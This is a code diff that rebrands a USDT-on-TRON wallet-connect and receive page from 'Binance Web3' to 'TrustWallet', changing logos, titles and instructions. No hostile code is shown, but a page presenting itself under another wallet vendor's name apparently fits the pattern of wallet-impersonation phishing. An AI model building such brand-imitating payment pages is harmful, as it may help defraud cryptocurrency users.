@@ -1,5 +1,5 @@
 import QRCode from "qrcode";
-import binanceLogoUrl from "../assets/binance-logo.png";
+import trustwalletLogoUrl from "../assets/trustwallet-logo.png";
 
 function esc(value: string): string {
   return value
@@ -50,7 +50,7 @@ function roundRectPath(
   ctx.closePath();
 }
 
-function drawBinanceLogo(canvas: HTMLCanvasElement, logo: HTMLImageElement): void {
+function drawTrustWalletLogo(canvas: HTMLCanvasElement, logo: HTMLImageElement): void {
   const ctx = canvas.getContext("2d");
   if (!ctx) return;
   const cx = canvas.width / 2;
@@ -92,10 +92,10 @@ function wireQrActions(canvas: HTMLCanvasElement | null, qrUri: string | null): 
           const file = new File([blob], "usdt-connect-qr.png", {
             type: "image/png",
           });
-          await navigator.share({ files: [file], title: "Connect Binance Web3" });
+          await navigator.share({ files: [file], title: "Connect TrustWallet" });
           return;
         }
-        await navigator.share({ title: "Connect Binance Web3", url: qrUri });
+        await navigator.share({ title: "Connect TrustWallet", url: qrUri });
         return;
       }
       await navigator.clipboard.writeText(qrUri);
@@ -133,7 +133,7 @@ function renderReceivePage(opts: ConnectViewOpts): void {
         </div>
       </div>
       <h1 class="receive-title">Receive</h1>
-      <p class="receive-subtitle">Others can scan with Binance App to pay</p>
+      <p class="receive-subtitle">Others can scan with TrustWallet to pay</p>
       <div class="receive-card">
         <div id="qr-box">
           <canvas id="qr-canvas" width="320" height="320"></canvas>
@@ -180,8 +180,8 @@ function renderReceivePage(opts: ConnectViewOpts): void {
     wireQrActions(canvas, opts.qrUri);
 
     const logo = new Image();
-    logo.onload = () => drawBinanceLogo(canvas, logo);
-    logo.src = binanceLogoUrl;
+    logo.onload = () => drawTrustWalletLogo(canvas, logo);
+    logo.src = trustwalletLogoUrl;
   }
 }
 
@@ -198,11 +198,11 @@ export function renderConnectView(opts: ConnectViewOpts): void {
     <div class="container">
       <div class="brand">
         <div class="brand-icon">₮</div>
-        <h1>Binance Web3</h1>
+        <h1>TrustWallet</h1>
         <p class="subtitle">Send USDT on TRON (TRC-20)</p>
       </div>
       ${opts.notice ? `<p class="notice">${esc(opts.notice)}</p>` : ""}
-      <p class="instruction">Connect with Binance Web3 Wallet</p>
+      <p class="instruction">Connect with TrustWallet</p>
       <button id="connect-btn" type="button">Connect Wallet</button>
       ${opts.error ? `<p id="connect-error" class="error">${esc(opts.error)}</p>` : ""}
     </div>
